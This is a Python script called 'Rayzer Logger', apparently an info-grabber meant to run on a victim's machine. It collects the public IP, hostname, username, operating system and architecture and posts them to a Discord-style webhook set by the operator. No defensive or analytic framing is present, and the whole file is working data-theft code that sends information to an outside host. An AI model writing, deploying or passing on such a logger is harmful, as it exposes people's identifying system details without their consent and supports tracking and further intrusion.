import requests
import socket
import os
import getpass
import platform
from datetime import datetime


WEBHOOK_URL = "PUT_WEBHOOK_HERE"

def get_public_ip():
    try:
        return requests.get('https://api.ipify.org').text
    except:
        return "Unknown"

def main():
    if WEBHOOK_URL == "PUT_WEBHOOK_HERE":
        print("Error: Webhook URL not set!")
        return

    ip = get_public_ip()
    hostname = socket.gethostname()
    username = getpass.getuser()
    os_info = platform.system() + " " + platform.release()
    arch = platform.machine()
    
    embed = {
        "username": "Rayzer Logger",
        "embeds": [{
            "title": "New Log",
            "color": 0x34d399,
            "fields": [
                {"name": "Public IP", "value": f"`{ip}`", "inline": True},
                {"name": "Hostname", "value": f"`{hostname}`", "inline": True},
                {"name": "Username", "value": f"`{username}`", "inline": True},
                {"name": "OS info", "value": f"`{os_info}`", "inline": False},
                {"name": "Arch", "value": f"`{arch}`", "inline": True}
            ],
            "footer": {"text": "Rayzer Logger"},
            "timestamp": datetime.utcnow().isoformat() + "Z"
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=embed)
    except Exception as e:
        print(f"Error: {e}")

if __name__ == "__main__":
    main()
